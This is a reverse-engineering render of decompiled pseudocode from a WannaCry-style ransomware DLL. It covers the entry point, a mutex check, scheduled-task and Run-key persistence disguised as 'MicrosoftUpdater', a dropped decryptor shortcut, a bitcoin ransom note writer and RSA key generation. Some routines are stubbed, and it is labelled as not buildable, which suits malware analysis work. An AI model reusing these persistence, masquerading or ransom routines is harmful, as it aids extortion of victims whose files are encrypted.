// ============================================================================
// payload.dll (decrypted t.wry) - Batch 1: StartTask + startup/persistence
// imagebase 0x10000000
// ----------------------------------------------------------------------------
// ANALYSIS ARTIFACT - readability render of Hex-Rays pseudocode. Not buildable.
// Operational bodies keep their documented step form; no working capability is
// added.
// ============================================================================

#include <windows.h>
#include <stdio.h>

// ============================================================================
// StartTask @0x10005ee0  (exported entry point)
// ============================================================================
int __stdcall StartTask(HMODULE hModule, LPSECURITY_ATTRIBUTES lpThreadAttributes)
{
    wchar_t Filename[261];
    GetModuleFileNameW(hModule, Filename, 0x103);
    {
        wchar_t *slash = wcsrchr(Filename, L'\\');
        if (slash) *slash = 0;
    }
    SetCurrentDirectoryW(Filename);

    if (sub_10005BB0() == 0)                        // load c.wry config
        return 0;

    dword_1000F2E0 = sub_10001240();                // running as SYSTEM?

    sprintf(Buffer,   "%08X.res", lpThreadAttributes);
    sprintf(FileName, "%08X.pky", lpThreadAttributes);
    sprintf(byte_1000F1B4, "%08X.eky", lpThreadAttributes);

    if (sub_10004770(lpThreadAttributes) != 0 ||    // single-instance mutex
        sub_10004660(lpThreadAttributes) != 0) {    // .dky recovery key present
        // decrypt-only path
        if (lpThreadAttributes == NULL && dword_1000F2E0 == 0) {
            HANDLE t = CreateThread(NULL, 0, sub_100049B0, NULL, 0, NULL);
            WaitForSingleObject(t, 0xFFFFFFFF);
            CloseHandle(t);
        }
        return 0;
    }

    sub_10001630(1);                                // Reg: Software\WannaCryptor = cwd

    OSVERSIONINFOA VersionInformation;
    GetVersionExA(&VersionInformation);
    if (VersionInformation.dwMajorVersion >= 6 && dword_1000F2E0 != 0)
        sub_10005CF0();                             // schtasks persistence (Vista+, SYSTEM)
    sub_10005C10();                                 // Run-key persistence
    sub_10004CA0();                                 // drop u.wry -> decryptor exe + shortcut
    sub_10004DB0();                                 // write "!Please Read Me!.txt" from r.wry

    void *v2 = operator new(0x28);
    void *v3 = sub_10003C40(v2);                    // crypto object ctor
    if (v3 == NULL || sub_10003CF0((HCRYPTPROV)FileName, byte_1000F1B4) == 0)
        return 0;                                   // RSA keygen -> .pky / .eky

    if (sub_10004800() == 0 || dword_1000F1F0 != lpThreadAttributes) {
        DeleteFileA(Buffer);                        // delete %08X.res
        sub_10004640(&pbBuffer, 8);                 // random 8 bytes
    }
    sub_10003DE0(v3);                               // destroy keys
    (**(void (***)(void *, int))v3)(v3, 1);         // vtable call: save/export keys

    HANDLE v4 = CreateThread(NULL, 0, sub_100048C0, NULL, 0, NULL);  // heartbeat worker
    Sleep(0x64);

    if (lpThreadAttributes != NULL) {              // /f <ip> targeted mode
        sub_100057B0((struct in_addr)lpThreadAttributes, UserName, Password);
        if (v4) {
            dword_1000F2DC = 1;
            WaitForSingleObject(v4, INFINITE);
            CloseHandle(v4);
        }
        if (dword_1000F260 > 0) {
            sub_10004860();
            return 0;
        }
        DeleteFileA(FileName);
        DeleteFileA(byte_1000F1B4);
        DeleteFileA(Buffer);
    } else {
        HANDLE v5 = CreateThread(NULL, 0, sub_10004730, NULL, 0, NULL); // .dky poller
        if (v5) CloseHandle(v5);
        Sleep(0x64);

        HANDLE v6 = CreateThread(NULL, 0, sub_10005720, NULL, 0, NULL); // drive watcher
        Sleep(0x64);

        if (dword_1000F2E0 == 0) {
            HANDLE v7 = CreateThread(NULL, 0, sub_100049B0, NULL, 0, NULL); // decryptor GUI
            if (v7) CloseHandle(v7);
            Sleep(0x64);
        }

        sub_100058C0();                            // main file-encryption orchestrator
        if (v6) {
            WaitForSingleObject(v6, INFINITE);
            CloseHandle(v6);
            return 0;
        }
    }
    return 0;
}

// ============================================================================
// sub_10005BB0 - load c.wry config
// ============================================================================
int sub_10005BB0(void)
{
    FILE *f = fopen("c.wry", "rb");
    if (f != NULL) {
        if (fread(&unk_1000EF40, 0x274, 1, f) == 1) {
            fclose(f);
            return 1;
        }
        fclose(f);
    }
    return 0;
}

// ============================================================================
// sub_10001240 - running as SYSTEM?
// ============================================================================
BOOL sub_10001240(void)
{
    wchar_t Buffer[300];
    BOOL isSystem;

    if (sub_10001140(Buffer) != 0)
        isSystem = (wcsicmp(L"S-1-5-18", Buffer) == 0);  // LocalSystem SID
    else {
        DWORD pcbBuffer = 300;
        GetUserNameW(Buffer, &pcbBuffer);
        isSystem = (wcsicmp(Buffer, L"SYSTEM") == 0);
    }
    return isSystem;
}

// ============================================================================
// sub_10004770 - single-instance mutex
// ============================================================================
int __cdecl sub_10004770(int a1)
{
    HANDLE v1 = OpenMutexA(0x100000, TRUE, Name);
    if (v1 != NULL) {
        CloseHandle(v1);
        return 1;                                   // already running
    }

    char Buffer[260];
    sprintf(Buffer, "%s%d", aGlobalWindowsT_0, a1);
    HANDLE MutexA = CreateMutexA(NULL, TRUE, Buffer);
    if (MutexA != NULL && GetLastError() == 183) {  // ERROR_ALREADY_EXISTS
        CloseHandle(MutexA);
        return 1;
    }
    sub_10001570(MutexA);
    return 0;
}

// ============================================================================
// sub_10004660 - .dky recovery-key check
// ============================================================================
int __cdecl sub_10004660(int a1)
{
    char Buffer[260];
    sprintf(Buffer, "%08X.dky", a1);

    if (GetFileAttributesA(Buffer) != INVALID_FILE_ATTRIBUTES &&
        GetFileAttributesA(FileName) != INVALID_FILE_ATTRIBUTES) {
        void *KeyCtx = sub_10003C40(NULL);
        if (sub_10003F40(FileName, Buffer) != 0) {   // validate keypair
            sub_10003C90(KeyCtx);
            return 1;
        }
        DeleteFileA(Buffer);
        sub_10003C90(KeyCtx);
    }
    return 0;
}

// ============================================================================
// sub_10001630 - store/restore working dir under Software\WannaCryptor
// ============================================================================
int __cdecl sub_10001630(int a1)
{
    // RegCreateKeyW under HKLM, then HKCU, of "Software\WannaCryptor"
    //   a1 != 0 : GetCurrentDirectoryA -> RegSetValueExA
    //   a1 == 0 : RegQueryValueExA -> SetCurrentDirectoryA
    return 0;
}

// ============================================================================
// sub_10005CF0 - scheduled-task persistence (SYSTEM, Vista+)
// ============================================================================
int sub_10005CF0(void)
{
    char Buffer[0x207];
    GetCurrentDirectoryA(0x207, Buffer);
    strcat(Buffer, "\\");
    strcat(Buffer, "1.xml");

    FILE *f = fopen(Buffer, "w");
    char v4[64], v6[64], Filename[MAX_PATH], v5[8];
    GetComputerNameA(v4, /*size*/ NULL);
    GetUserNameA(v6, /*size*/ NULL);
    GetModuleFileNameA(NULL, Filename, MAX_PATH);
    sprintf(v5, "/r");

    // Writes a Task Scheduler XML (Author "Microsoft Windows", PT1M repetition,
    // StartBoundary 2001-01-01T00:00:00, Exec Command = this exe, Arguments "/r").
    fprintf(f, /* XML template */ NULL, v4, v6, Filename, v5);
    fclose(f);

    char CommandLine[0x410];
    sprintf(CommandLine, "schtasks /create /xml \"%s\" /tn \"%s\" /f", Buffer, "MicrosoftUpdater");
    int v2 = sub_10001000(CommandLine, 1, NULL);    // hidden cmd exec
    DeleteFileA(Buffer);
    return v2;
}

// ============================================================================
// sub_10005C10 - Run-key persistence
// ============================================================================
LSTATUS sub_10005C10(void)
{
    char Filename[MAX_PATH], Buffer[MAX_PATH + 8];
    GetModuleFileNameA(NULL, Filename, 0x104);
    sprintf(Buffer, "\"%s\" /r", Filename);

    // SubKey = Software\Microsoft\Windows\CurrentVersion\Run
    HKEY hive = (sub_100012D0() != 0) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    HKEY phkResult;
    LSTATUS result = RegOpenKeyExW(hive, SubKey, 0, 0xF003F, &phkResult);
    if (result == 0) {
        RegSetValueExA(phkResult, "MicrosoftUpdater", 0, REG_SZ, Buffer, strlen(Buffer) + 1);
        return RegCloseKey(phkResult);
    }
    return result;
}

// ============================================================================
// sub_10004CA0 - drop decryptor + desktop shortcut
// ============================================================================
DWORD sub_10004CA0(void)
{
    CopyFileA("u.wry", "@WanaDecryptor@.exe", FALSE);

    DWORD result = GetFileAttributesA(aWannadecryptor_0);
    if (result == INVALID_FILE_ATTRIBUTES) {
        // Batch that emits a .vbs creating a .lnk to the decryptor, run via cscript
        char Format[] =
            "@echo off\r\n"
            "echo Set o = WScript.CreateObject(\"WScript.Shell\")> c.vbs\r\n"
            "echo Set ol = o.CreateShortcut(\"%s%s\")>> c.vbs\r\n"
            "echo ol.TargetPath = \"%s%s\">> c.vbs\r\n"
            "echo ol.Save>> c.vbs\r\n"
            "cscript //nologo c.vbs\r\n"
            "del c.vbs\r\n";

        char Buffer[0x208], v4[0x400];
        GetCurrentDirectoryA(0x208, Buffer);
        sprintf(v4, Format, Buffer, aWannadecryptor_0, Buffer, "@WanaDecryptor@.exe");
        return sub_100010B0(v4);                    // write + run temp .bat
    }
    return result;
}

// ============================================================================
// sub_10004DB0 - write ransom note .txt from r.wry
// ============================================================================
FILE *sub_10004DB0(void)
{
    FILE *result = fopen("r.wry", "rb");
    if (result != NULL) {
        char Buffer[0x800], v3[64], v5[0x1000];
        fread(Buffer, 1, 0x800, result);
        fclose(result);

        result = wfopen(L"!Please Read Me!.txt", L"wb");
        if (result != NULL) {
            if (dword_1000EFBC != 0)
                sprintf(v3, "%.1f BTC", flt_1000EFB8);
            else
                sprintf(v3, "$%d worth of bitcoin", (unsigned int)flt_1000EFB8);  // $300

            sprintf(v5, Buffer, v3, &unk_1000EFF2, "@WanaDecryptor@.exe",
                    &unk_1000F150, &unk_1000EFC0);
            fwrite(v5, 1, strlen(v5) + 1, result);
            return (FILE *)fclose(result);
        }
    }
    return result;
}

// ============================================================================
// sub_10003C40 - crypto object constructor
// ============================================================================
char *__thiscall sub_10003C40(char *this)
{
    *((DWORD *)this + 1) = 0;
    *((DWORD *)this + 2) = 0;
    *((DWORD *)this + 3) = 0;
    *(DWORD *)this = (DWORD)&off_1000827C;          // vtable
    InitializeCriticalSection((LPCRITICAL_SECTION)(this + 16));
    return this;
}

// ============================================================================
// sub_10003CF0 - RSA keypair setup (import public / generate / export)
// ============================================================================
int __thiscall sub_10003CF0(HCRYPTPROV *this, CHAR *hPubKey, LPCSTR lpFileName)
{
    if (sub_10003CB0() == 0)                        // CryptAcquireContext
        goto FAIL;

    if (hPubKey != NULL) {
        if (sub_10003E30(hPubKey) == 0) {           // file exists?
            if (!CryptImportKey(*(this + 1), &byte_1000E00C, 0x114, 0, 0, this + 3)   // embedded public blob
                || sub_10004570(*(this + 1), this + 2) == 0                            // CryptGenKey AT_KEYEXCHANGE
                || sub_10004270(*(this + 1), *(this + 2), 6, hPubKey) == 0)            // export PUBLICKEYBLOB -> .pky
                goto FAIL;
            if (lpFileName != NULL)
                sub_10003E70(lpFileName);           // export encrypted private -> .eky
            if (sub_10003E30(hPubKey) == 0)
                goto FAIL;
        }
        HCRYPTKEY v5 = *(this + 3);
        if (v5 != 0)
            CryptDestroyKey(v5);
    } else if (!CryptImportKey(*(this + 1), &pbData, 0x114, 0, 0, this + 2)) {
    FAIL:
        sub_10003DE0(this);
        return 0;
    }
    return 1;
}
